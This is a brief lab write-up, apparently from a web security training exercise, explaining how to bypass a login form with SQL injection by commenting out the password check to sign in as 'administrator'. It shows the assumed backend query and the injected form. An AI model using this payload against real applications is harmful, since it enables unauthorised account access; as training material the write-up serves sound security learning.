# Objective
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
# Write up
The SQL should look like
```sql
SELECT * FROM users WHERE username = 'input_username' AND password = 'input_passwd'
```
We can bypass the authentication by make the password statement disabled:
```sql
SELECT * FROM users WHERE username = 'administrator' AND 1=1 -- AND password='input_passwd'
```
